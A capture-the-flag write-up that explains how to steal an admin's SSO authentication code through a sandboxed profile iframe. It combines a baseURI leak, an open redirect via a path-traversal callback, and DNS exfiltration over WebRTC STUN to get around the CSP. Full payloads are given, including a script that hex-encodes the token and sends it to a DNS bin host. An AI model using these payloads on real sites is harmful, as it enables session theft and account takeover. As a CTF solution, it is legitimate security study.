## Overview

The application is a useless website, the only features available are:
- log in and register through an external sso
- set your profile description as HTML in a sandboxed iframe
- check the descriptions of public users

The flag is in the profile description of the admin.



The profile description is sandboxed inside an iframe like this:
```html
<iframe sandbox="allow-scripts" srcdoc="<%= profile.desc %>"></iframe>
```

Moreover, inside the iframe, the following CSP applies (inherited from the parent document):

```http
Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline' https://cdn.jsdelivr.net/; style-src 'unsafe-inline' https://cdn.jsdelivr.net/; img-src data: ; connect-src 'self'
```


### Location leak

Even if we are in a sandboxed iframe, and we can't access directly the location of the parent document, we can still leak the full URL of the parent document accessing the *baseURI* variable like this:

```html
<svg onload="console.log(baseURI)">
```

*baseURI* also includes the URL fragment, if we are able to change the callback of the sso to our exploit, we could leak a valid authentication code of the admin.


### Redirect

The callback URL is checked by the following code:

```js
host.startsWith(`${CHALL_URL}/cb`)
```

We can manipulate the callback value to force a redirection to our profile like this:

```
http://sso.aua.challs.teamitaly.eu/login?callback=http://site.aua.challs.teamitaly.eu/cb/../profile?user=aaaaa
```

When the admin bot visits this link, it will redirect to the profile of user *aaaaa* with a valid authentication token in the fragment.

### Leak

Now we are able to access the auth token of the admin, we only need a way to leak it to us.

Because of the presence of the CSP, we can't simply use a webhook to leak information.

However, we can still use DNS exfiltration abusing the RTC protocol, using this payload:

```js
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```


### Exploit


#### Profile payload

First of all, we need to register a user and set its profile to a payload similar to this, leaking the fragment of the parent URL and leaking it to the DNS bin.

```html
<script>
function asciitoHex(ascii){
res = ''
 for (var n = 0; n < ascii.length; n ++) {
  res += Number(ascii.charCodeAt(n)).toString(16);

}return res;}
</script>
<svg onload="(async()=>{p=new RTCPeerConnection({iceServers:[{urls: 'stun:'+asciitoHex(baseURI.split('#')[1])+'.your.dns.bin.test'}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()">
```


#### Exploit server

First of all we need the bot to log into the real application (as it's only logged in the sso).

Then, we can redirect the bot to the `/login` endpoint of the sso with the callback to the profile of our user.

```html
<script>
  // login the admin in the app
  w = window.open('http://site.aua.challs.teamitaly.eu/login')

  explurl = 'http://sso.aua.challs.teamitaly.eu/login?callback=http://site.aua.challs.teamitaly.eu/cb/../profile?user=aaaaa'
  
  setTimeout(()=>{location = explurl}, 1000)
</script>
```

After the attack, we will leak the authentication token in the DNS bin, we can use the token to access the app as the admin and retrieve the flag.
